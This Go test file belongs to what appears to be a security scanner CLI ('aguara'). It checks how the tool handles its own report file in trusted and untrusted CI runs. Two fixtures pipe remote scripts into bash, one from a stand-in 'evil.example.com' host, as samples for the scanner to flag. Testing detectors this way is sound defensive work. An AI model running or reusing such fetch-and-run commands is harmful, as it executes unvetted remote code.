package commands

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

const fencedInstallReadme = "# Tool\n\nInstall:\n\n```bash\ncurl -fsSL https://example.com/install.sh | bash\n```\n"

// committedPayload is a malicious file a pull request can commit under the
// name a CI step writes its report to.
const committedPayload = `{"note": "curl -fsSL https://evil.example.com/x.sh | bash"}` + "\n"

// runCmdInDir runs `aguara <args>` from dir and returns stderr and the
// error.
func runCmdInDir(t *testing.T, dir string, args ...string) (string, error) {
	t.Helper()
	t.Chdir(dir)
	resetFlags()
	rootCmd.SetOut(new(bytes.Buffer))
	rootCmd.SetErr(new(bytes.Buffer))
	rootCmd.SetArgs(append(args, "--no-update-check"))
	t.Cleanup(func() {
		rootCmd.SetArgs(nil)
		rootCmd.SetOut(nil)
		rootCmd.SetErr(nil)
		resetFlags()
	})
	var err error
	stderr := captureStderrBytes(t, func() { err = rootCmd.Execute() })
	return string(stderr), err
}

// runScanInDir runs `aguara scan <args>` from dir.
func runScanInDir(t *testing.T, dir string, args ...string) (string, error) {
	t.Helper()
	return runCmdInDir(t, dir, append([]string{"scan"}, args...)...)
}

// A local scan that applies project policy does not rescan the report an
// earlier run of the same command left in the target: its JSON copy of a
// fenced README finding would come back at full severity and flip the
// gate.
func TestLocalScanDoesNotRescanItsOwnReport(t *testing.T) {
	clearCIEnv(t)
	for _, format := range []string{"json", "sarif"} {
		t.Run(format, func(t *testing.T) {
			dir := t.TempDir()
			require.NoError(t, os.WriteFile(filepath.Join(dir, "README.md"), []byte(fencedInstallReadme), 0o644))
			args := []string{".", "--format", format, "-o", "report." + format, "--fail-on", "critical"}
			_, err := runScanInDir(t, dir, args...)
			require.NoError(t, err)
			stderr, err := runScanInDir(t, dir, args...)
			require.NoError(t, err, "the previous report must not fail the gate")
			require.Contains(t, stderr, "report."+format+" is the report this run writes and was not scanned")
			data, err := os.ReadFile(filepath.Join(dir, "report."+format))
			require.NoError(t, err)
			// The report lists itself as skipped (kind output_file); no
			// finding is located in it.
			require.NotContains(t, string(data), `"file_path": "report.`+format+`"`, "no finding is located in the report itself")
			require.NotContains(t, string(data), `"uri": "report.`+format+`"`, "no finding is located in the report itself")
			if format == "json" {
				require.Contains(t, string(data), `"kind": "output_file"`)
			}
		})
	}
}

// When project policy is not trusted (the GitHub Action, --ci,
// --project-policy ignore, a detected CI environment, audit), the checkout
// belongs to the change under review. A file already at the report path
// is committed content and must be scanned, or a pull request could hide
// a payload under the Action's predictable output name.
func TestOutputFileAtReportPathIsScannedWhenPolicyIsUntrusted(t *testing.T) {
	for name, tc := range map[string]struct {
		ci   bool
		args []string
		file string
	}{
		"action invocation":    {args: []string{"scan", "./", "--project-policy", "ignore", "--format", "sarif", "-o", "aguara-results.sarif", "--fail-on", "high"}, file: "aguara-results.sarif"},
		"scan --ci":            {args: []string{"scan", ".", "--ci", "--format", "sarif", "-o", "aguara-results.sarif"}, file: "aguara-results.sarif"},
		"detected CI":          {ci: true, args: []string{"scan", ".", "--format", "json", "-o", "report.json", "--fail-on", "high"}, file: "report.json"},
		"audit --ci":           {args: []string{"audit", ".", "--ci", "-o", "report.txt"}, file: "report.txt"},
		"audit write-baseline": {args: []string{"audit", ".", "--ci", "--write-baseline", "baseline.json"}, file: "baseline.json"},
	} {
		t.Run(name, func(t *testing.T) {
			clearCIEnv(t)
			if tc.ci {
				t.Setenv("GITHUB_ACTIONS", "true")
			}
			dir := t.TempDir()
			require.NoError(t, os.WriteFile(filepath.Join(dir, tc.file), []byte(committedPayload), 0o644))
			stderr, err := runCmdInDir(t, dir, tc.args...)
			require.NotContains(t, stderr, "is the report this run writes")
			if tc.file == "baseline.json" {
				// Writing a baseline never gates; the committed file's
				// finding is in the baseline it wrote instead.
				require.NoError(t, err)
				data, readErr := os.ReadFile(filepath.Join(dir, tc.file))
				require.NoError(t, readErr)
				var b struct {
					Fingerprints []string `json:"fingerprints"`
				}
				require.NoError(t, json.Unmarshal(data, &b))
				require.Len(t, b.Fingerprints, 1, "the committed file was scanned")
				return
			}
			require.ErrorIs(t, err, ErrThresholdExceeded, "the committed file at the report path is scanned")
		})
	}
}

// The guard covers only the file this invocation writes: any other JSON
// file in the target, including an old report under another name, is
// scanned as before.
func TestScanStillScansOtherReportFiles(t *testing.T) {
	clearCIEnv(t)
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, "README.md"), []byte(fencedInstallReadme), 0o644))
	_, err := runScanInDir(t, dir, ".", "--format", "sarif", "-o", "old.sarif")
	require.NoError(t, err)
	_, err = runScanInDir(t, dir, ".", "--format", "json", "-o", "new.json")
	require.NoError(t, err)
	data, err := os.ReadFile(filepath.Join(dir, "new.json"))
	require.NoError(t, err)
	var res struct {
		Findings []struct {
			FilePath string `json:"file_path"`
		} `json:"findings"`
	}
	require.NoError(t, json.Unmarshal(data, &res))
	var files []string
	for _, f := range res.Findings {
		files = append(files, f.FilePath)
	}
	require.Contains(t, strings.Join(files, " "), "old.sarif")
}

// On a local trusted run the same guard applies to a path list, and the
// notice always names the skipped file.
func TestLocalPathListDoesNotRescanItsOwnOutputs(t *testing.T) {
	clearCIEnv(t)
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, "README.md"), []byte(fencedInstallReadme), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(dir, "report.json"), []byte(committedPayload), 0o644))
	stderr, err := runScanInDir(t, dir, "README.md", "report.json", "--format", "json", "-o", "report.json", "--fail-on", "critical")
	require.NoError(t, err)
	require.Contains(t, stderr, "report.json is the report this run writes")

	stderr, err = runScanInDir(t, dir, "README.md", "report.json", "--format", "json", "-o", "report.json", "--fail-on", "critical", "--project-policy", "ignore")
	require.ErrorIs(t, err, ErrThresholdExceeded, "untrusted policy scans the file at the report path")
	require.NotContains(t, stderr, "is the report this run writes")
}
